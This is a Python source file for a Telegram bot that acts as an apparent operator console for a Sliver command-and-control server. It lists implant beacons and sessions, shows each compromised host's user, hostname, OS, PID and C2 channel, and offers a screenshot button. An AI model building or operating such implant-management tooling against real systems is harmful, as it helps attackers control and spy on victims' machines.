from aiogram import Router, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
#from sliver.beacons import get_all_beacons, get_all_beacons_message
import config as cfg
import asyncio
from aiogram.utils.formatting import Text, Bold, Code
from datetime import datetime, timezone

logger = cfg.logger
UUID_REGEX = cfg.UUID_REGEX
router = Router()

reply_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="screenshot")]
    ],
    resize_keyboard=True
)

def current_beacons(beacons, sessions):
    global all_beacons
    all_beacons = beacons
    global all_sessions
    all_sessions = sessions
    #logger.error(all_beacons)

def format_time(time_to_format):
    last_checkin_dt = datetime.fromtimestamp(time_to_format, tz=timezone.utc)
    formated_time = last_checkin_dt.strftime('%a, %d %b %Y %H:%M:%S')
    current_time = datetime.now(timezone.utc)
    time_diff = current_time - last_checkin_dt
    total_seconds = int(time_diff.total_seconds())

    hours = total_seconds // 3600
    minutes = (total_seconds % 3600) // 60
    seconds = total_seconds % 60

    ago_parts = []
    if hours > 0:
        ago_parts.append(f"{hours}h")
    if minutes > 0 or hours > 0:
        ago_parts.append(f"{minutes}m")
    ago_parts.append(f"{seconds}s")

    ago_str = " ".join(ago_parts)

    final_time = f"{formated_time} ({ago_str} ago)"
    return final_time

#def format_time(time_to_format):
#    last_checkin_dt = datetime.fromtimestamp(time_to_format, tz=timezone.utc)
#    #formated_time = last_checkin_dt.strftime('%Y-%m-%d %H:%M:%S UTC')
#    formated_time = last_checkin_dt.strftime('%a, %d %b %Y %H:%M:%S')
#    current_time = datetime.now(timezone.utc)
#    time_diff = current_time - last_checkin_dt
#    seconds_ago = int(time_diff.total_seconds())
#    final_time = f"{formated_time} ({seconds_ago}s ago)"
#    return final_time 

@router.message(lambda msg: msg.text == "info")
async def action_info(message: types.Message):
    logger.info(all_beacons)
    #all_beacons_list = list(all_beacons.keys())
    logger.info(all_beacons[0])
    code_obj_beacons = [Code(f"\n\n{all_beacons[id].ID}") + Bold(f"\n{all_beacons[id].Username}") + Code(f"\n{format_time(all_beacons[id].LastCheckin)}") for id, beacon in enumerate(all_beacons)]
    try:
        logger.info(all_sessions[0])
    except:
        logger.info(f"[x] no sessions found")
    #code_ojb_sessions = [Code(f"\n\n{session}") + f"\n{all_sessions[id].Username}" for session in all_sessions]
    code_obj_sessions = [Code(f"\n\n{all_sessions[id].ID}") + f"\n{all_sessions[id].Username}" for id, session in enumerate(all_sessions)]
    info_message = Text(Bold("⚔️ all active/dead beacons ⚔️"),
                   *code_obj_beacons,
                   Bold("\n\n⚔️ all active/dead sessions ⚔️"),
                   *code_obj_sessions,
                   Bold("\n\n🗡 enter beacon/session UUID:"))
    await message.answer(**info_message.as_kwargs())

@router.message(lambda msg: msg.text == "sessions")
async def all_sessions_info(message: types.Message):
    logger.info(all_sessions)
    if len(all_sessions) <= 0:
        await message.answer("[x] no sessions found")
    else:
        logger.info(f'[*] session[0]: {all_sessions[0]}')
        code_objects = [Bold(f"\n\n[{id}] ") + Code(f"{all_sessions[id].ID}") + f"\n{all_sessions[id].Username}" + Code(f"\n{format_time(all_sessions[id].LastCheckin)}") for id, session in enumerate(all_sessions)]

        info_message = Text(Bold("⚔️ all active/dead sessions ⚔️"),
                       *code_objects,
                       Bold("\n\n🗡 enter session UUID:"))
        await message.answer(**info_message.as_kwargs())

def get_beacon_by_id(beacons, beacon_id):
    return next((beacon for beacon in beacons if beacon.ID == beacon_id), None)

@router.message(lambda message: UUID_REGEX.match(message.text.strip()))
async def get_beacon_info(message: types.Message):
    uuid = message.text.strip()
    beacon = get_beacon_by_id(all_beacons, uuid)
    session = get_beacon_by_id(all_sessions, uuid)
    #beacon = all_beacons.get(uuid)
    try:
        print(beacon)
        print("------------")
        print(beacon.Username)
    except:
        print(session)
        print("------------")
        print(session.Username)
    if beacon: 
        message_text = Text(Bold("🔓 beacon data 🔓\n\n"),
                           Bold("UUID:   "), Code(beacon.ID),
                           Bold("\n\nuser:   "), Code(beacon.Username),
                           Bold("\nhostname:   ", Code(beacon.Hostname)),
                           Bold("\nOS:   "), Code(beacon.OS),
                           Bold("\nbuild:   "), Code(beacon.Version),
                           Bold("\nfile:  "), Code(beacon.Filename),
                           Bold("\nPID:   "), Code(beacon.PID),
                           Bold("\ntransport:   "), Code(beacon.Transport),
                           Bold("\nactive C2: "), Code(beacon.ActiveC2),
                           Bold("\nlast checkin:    ", Code(format_time(beacon.LastCheckin)))
                           )
        await message.answer(**message_text.as_kwargs(), reply_markup=reply_kb)
    elif session:
         message_text = Text(Bold("🔓 session data 🔓\n\n"),
                           Bold("UUID:   "), Code(session.ID),
                           Bold("\n\nuser:   "), Code(session.Username),
                           Bold("\nhostname:   ", Code(session.Hostname)),
                           Bold("\nOS:   "), Code(session.OS),
                           Bold("\nbuild:   "), Code(session.Version),
                           Bold("\nfile:  "), Code(session.Filename),
                           Bold("\nPID:   "), Code(session.PID),
                           Bold("\ntransport:   "), Code(session.Transport),
                           Bold("\nactive C2: "), Code(session.ActiveC2),
                           Bold("\nlast message: ", Code(format_time(session.LastCheckin)))
                           )
         await message.answer(**message_text.as_kwargs(), reply_markup=reply_kb)
    else:
        await message.answer("beacon not found")
